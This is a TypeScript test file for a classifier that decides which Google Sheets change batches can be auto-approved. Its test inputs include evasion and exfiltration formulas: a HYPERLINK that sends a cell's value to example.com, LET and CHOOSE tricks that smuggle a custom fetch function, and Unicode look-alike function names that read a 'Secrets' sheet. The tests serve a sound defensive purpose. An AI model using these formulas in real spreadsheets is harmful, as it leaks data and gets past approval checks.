import { ActionJournal } from "@gadgets/gatekeeper-kit/actions";
import type { ActionDescription } from "@gadgets/workshop-shared/gatekeeper";
import { describe, expect, it } from "vitest";
import { SHEETS_ACTIONS, batchKind, type SheetsHost } from "../src/sheets-actions";
import type { SheetsAction, SheetsActions } from "../src/sheets-simulation";
import type { SheetCellInput } from "../src/sheets-types";
import { FakeKv } from "./fake-kv";
import { rect } from "./sheets-fixture";

type Change = { op: string; values?: SheetCellInput[][] };

const write = (...values: SheetCellInput[]): Change => ({ op: "writeCells", values: [values] });
const CLEAR: Change = { op: "clearRange" };
const FORMAT: Change = { op: "formatCells" };
const KEEPING: Change[] = ["addSheet", "renameSheet", "duplicateSheet", "insertRows", "insertColumns"]
  .map(op => ({ op }));
const DELETING: Change[] = ["deleteSheet", "deleteRows", "deleteColumns"].map(op => ({ op }));

describe("Google Sheets batch kinds", () => {
  it("queues only formatting as formatSheets, and only literal values and clears as editSheetValues", () => {
    expect(batchKind([FORMAT, FORMAT])).toBe("formatSheets");
    expect(batchKind([write(1, "text", null, true), CLEAR])).toBe("editSheetValues");
    expect(batchKind([CLEAR])).toBe("editSheetValues");
  });

  it("queues a batch that keeps every sheet, row and column and calls only spreadsheet functions as editSpreadsheet", () => {
    expect(batchKind([write("=SUM(B2:B3)"), CLEAR])).toBe("editSpreadsheet");
    expect(batchKind([write("x"), FORMAT])).toBe("editSpreadsheet");
    for (let change of KEEPING) {
      expect(batchKind([change]), change.op).toBe("editSpreadsheet");
      expect(batchKind([change, write(1, '=IF(A1 > 1, "big", "small")'), CLEAR, FORMAT]), change.op)
        .toBe("editSpreadsheet");
    }
  });

  it("queues a batch deleting a sheet, rows or columns as updateSpreadsheet, alone or among other changes", () => {
    for (let change of DELETING) {
      expect(batchKind([change]), change.op).toBe("updateSpreadsheet");
      expect(batchKind([write(1), change, FORMAT]), change.op).toBe("updateSpreadsheet");
      expect(batchKind([...KEEPING, change]), change.op).toBe("updateSpreadsheet");
    }
  });

  it("queues a batch with a formula calling any other function as updateSpreadsheet", () => {
    // One of the spreadsheet's named functions may wrap a fetch; HYPERLINK carries data to a site.
    expect(batchKind([write("=MYFETCH(A1)")])).toBe("updateSpreadsheet");
    expect(batchKind([write(1, "=SUM(A1)"), write('=HYPERLINK("https://example.com/?" & A1)')]))
      .toBe("updateSpreadsheet");
    expect(batchKind([{ op: "insertRows" }, write("=GOOGLEFINANCE(A1)")])).toBe("updateSpreadsheet");
    expect(batchKind([write("=SUM(A1) + 'stray")])).toBe("updateSpreadsheet");
    // A name a LET binds can shadow a listed function and stand for a named function passed by name.
    expect(batchKind([write("=LET(SUM, MYFETCH, SUM(Secrets!A1))")])).toBe("updateSpreadsheet");
    expect(batchKind([{ op: "insertRows" }, write("=CHOOSE(1, MYFETCH)(A1)")])).toBe("updateSpreadsheet");
    // A name whose Unicode upper case is a listed one, such as `ſum`, can only be a named function.
    for (let formula of ["=\u017Fum(Secrets!A1)", "=\u0131f(TRUE, Secrets!A1, 1)", "=\uFB01lter(A1:A2, TRUE)"]) {
      expect(batchKind([write(formula)]), formula).toBe("updateSpreadsheet");
    }
  });

  it("queues a change it does not classify as updateSpreadsheet", () => {
    expect(batchKind([{ op: "sortRange" }])).toBe("updateSpreadsheet");
    expect(batchKind([write(1), { op: "sortRange" }])).toBe("updateSpreadsheet");
  });
});

describe("Google Sheets auto-approval verdicts", () => {
  /** What each kind is submitted for approval with. */
  async function described(kind: keyof SheetsActions): Promise<ActionDescription> {
    let journal = new ActionJournal<SheetsAction>(new FakeKv(), { namespace: "sheets" });
    let actions = SHEETS_ACTIONS.bind(journal, {} as SheetsHost);
    let description: ActionDescription | undefined;
    await actions.submit({ submitAction: async (_id, desc) => { description = desc; } }, kind, {
      changes: [{ op: "clearRange", sheetId: 0, rect: rect(0, 0) }],
      sheets: { 0: "Sales" }, marker: { id: 1, token: "t" }, guard: { sha256: "", after: [] },
    });
    return description!;
  }

  it("lets a user auto-approve value edits, formatting and edits that keep every sheet, row and column", async () => {
    expect(SHEETS_ACTIONS.bind(
      new ActionJournal<SheetsAction>(new FakeKv(), { namespace: "sheets" }), {} as SheetsHost,
    ).autoApprovableKinds()).toEqual([
      { tag: "editSheetValues", label: "Sheet value edits" },
      { tag: "formatSheets", label: "Sheet formatting" },
      { tag: "edit-spreadsheet", label: "Spreadsheet edits that keep every sheet, row and column" },
    ]);
    expect(await described("editSheetValues")).toMatchObject({
      autoApprovable: true, actionKind: { tag: "editSheetValues" },
    });
    expect(await described("formatSheets")).toMatchObject({
      autoApprovable: true, actionKind: { tag: "formatSheets" },
    });
    expect(await described("editSpreadsheet")).toMatchObject({
      autoApprovable: true, actionKind: { tag: "edit-spreadsheet" },
    });
  });

  it("never auto-approves a batch that deletes or runs unchecked formulas", async () => {
    expect(await described("updateSpreadsheet")).toMatchObject({
      autoApprovable: false,
      actionKind: { tag: "update-spreadsheet", label: "Spreadsheet changes that delete or run unchecked formulas" },
    });
  });
});
